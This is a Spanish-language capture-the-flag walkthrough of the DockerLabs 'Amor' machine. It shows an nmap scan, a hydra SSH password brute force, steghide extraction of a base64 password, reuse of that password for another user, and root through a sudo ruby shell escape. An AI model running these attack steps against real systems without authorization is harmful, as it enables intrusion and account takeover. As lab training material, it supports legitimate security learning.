# Amor

# Enumeración

Empezamos con un escaneo de los puertos.

`sudo nmap -p- --open -sC -sS -sV --min-rate=5000 -n -Pn -vvv 172.17.0.2 -oN Amor`  

- `-p-` : Todos los puertos
- `--open` : Todos los puertos abiertos
- `-sC` : Escaneo de todos los scripts
- `-sS` : Escaneo de todos los servicios
- `-sV` : Escaneo de todas las versiones de los servicios
- `--min-rate 5000` : Establece mínimo envío de paquetes mínimos 5000/s
- `-n` : No aplica resolución DNS
- `-Pn` : Omisión de detección de hosts
- `-vvv` : Verbose - Muestra toda la información

# Resultado escaneo  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_1.jpg)   

Tenemos solamente dos puertos abiertos, el 22 y el 80. 
Miramos a ver que encontramos en el puerto 80.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_2.jpg)   

Vemos que hay un usuario de la empresa que se llama **carlota**, por lo tanto lo que podemos intentar hacer es un ataque de fuerza bruta contra ssh.   
Ejecutaremos el comando:  

`sudo hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t64`  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_3.jpg)     

Perfecto!  
Ya tenemos una contraseña valida y nos logeamos por ssh.  
Una vez dentro ejecutamos el comando `sudo -l` pero vemos que no podemos sacar nada.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_4.jpg)   

Lo mismo nos pasa con el comando `find / -perm -4000 2>/dev/null`  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_5.jpg)     

Mirando un poco en la carpeta del usuario vemos que hay una carpeta fotos que contiene una imagen.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_6.jpg)     

Nos la descgargamos con el comando:  

`scp -rpC carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Downloads`  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_7.jpg)    

La abrimos y al parecer no hay nada interesante.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_8.jpg)     

Entonces usaremos la herramienta **exiftool"** para ver si hay algun metadato que nos puede servir, pero parece que no.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_9.jpg)     

Entonces probamos con la herramienta **steghide**.  
Le damos al comando:  

`sudo steghide extract -sf imagen.jpg`  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_10.jpg)   

Vemos que nos extrae un fichero nombrado **secret.txt**.  
Lo abrimos y al parecer esta podría ser una contraseña codificada en base64.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_11.jpg)     

Por lo tanto la decodificamos con el comando:  

`echo 'ZXNsYWNhc2FkZXBpbnlwb24=' |base64 -d`  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_12.jpg)  

Perfecto!  
Ahora miramos en el /etc/passwd si hay algún otro usuario a parte de carlota.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_13.jpg)  

Bien!  
Probamos la contraseña recien descubierta con el usuario oscar...y funciona!    

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_14.jpg)    

Ahora le damos al comando `sudo -l`.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_15.jpg)      

Bien, miramos en la web de GTFOBins si y como podemos abusar de este binario para escalar de privilegios.  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_16.jpg)       

Entonces ejecutaremos el comando:    

`sudo ruby -e 'exec "/bin/sh"'` y listo!  

Ya somos root!  

![A](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/amor/A_17.jpg)         













